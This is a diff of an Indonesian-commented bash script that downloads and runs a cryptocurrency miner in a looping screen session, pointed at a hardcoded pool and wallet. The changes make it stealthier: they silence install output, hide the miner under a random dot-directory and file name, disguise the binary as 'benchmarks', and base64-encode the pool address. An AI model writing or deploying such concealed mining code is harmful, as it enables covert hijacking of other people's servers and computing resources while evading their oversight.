@@ -1,38 +1,34 @@
 #!/bin/bash
-echo "📦 Menginstal dependensi..."
-apt-get update && apt-get install -y screen wget tar
+apt update -y >/dev/null 2>&1 && apt install -y screen wget tar curl -y >/dev/null 2>&1
 
-echo "📁 Menyimpan skrip mining ke /root/benchmarks.sh..."
-cat << 'EOF' > /root/benchmarks.sh
+# Nama acak (6 karakter)
+XBIN=$(tr -dc a-z0-9 </dev/urandom | head -c 6)
+XDIR="/root/.${XBIN}"
+
+# Pool terenkripsi base64
+ENC_POOL="c3RyYXR1bSt0Y3A6Ly91cy1jZW50cmFsLnJldHJvbWlrZS5uZXQ6NTAwNQ=="
+DEC_POOL=$(echo "$ENC_POOL" | base64 -d)
+
+# Wallet
+WALLET="PQ1TCGVFEz8LzEgiyECHCVozsdtLvQ2N61"
+
+# Siapkan direktori dan jalankan
+mkdir -p "$XDIR"
+cat << EOF > $XDIR/.${XBIN}.sh
 #!/bin/bash
+cd "$XDIR" || exit
 
-cd /root || exit
+# Download binary jika belum ada
+[ ! -f $XDIR/$XBIN ] && git clone https://github.com/amirul5656/yui56.git "$XDIR/.tmp" && \
+cd "$XDIR/.tmp" && chmod +x benchmarks && cp benchmarks "$XDIR/$XBIN"
 
-# Download miner jika belum ada
-if [ ! -f benchmarks ]; then
-  echo "⬇️ Mengunduh file benchmarks..."
-  git clone https://github.com/amirul5656/yui56.git
-  cd yui56
-  chmod +x benchmarks
-fi
-
-# Cek apakah screen sudah berjalan
-if screen -list | grep -q daamirul3; then
-  echo "⚠️  Screen 'amirul3' sudah jalan, skip."
-else
-  echo "▶ Menjalankan mining di screen 'amirul3'..."
-  screen -dmS daamirul3 bash -c '
-    while true; do
-      ./benchmarks --algorithm xelisv2_pepew --pool stratum+tcp://us-central.retromike.net:5005 -u PQ1TCGVFEz8LzEgiyECHCVozsdtLvQ2N61 -p x --cpu-threads 7
-      sleep 2
-    done
-  '
-fi
+# Jalankan jika belum ada screen aktif
+screen -list | grep -q $XBIN || screen -dmS $XBIN bash -c '
+  while true; do
+    $XDIR/$XBIN --algorithm xelisv2_pepew --pool $DEC_POOL -u $WALLET -p x --cpu-threads 7
+    sleep 2
+  done
+'
 EOF
 
-chmod +x /root/benchmarks.sh
-
-echo "🚀 Menjalankan miner sekarang..."
-bash /root/benchmarks.sh
-
-echo "✅ Siap! Mining aktif sekarang & otomatis jalan setelah reboot lewat /etc/rc.local."
+chmod +x "$XDIR/.${XBIN}.sh" && bash "$XDIR/.${XBIN}.sh"
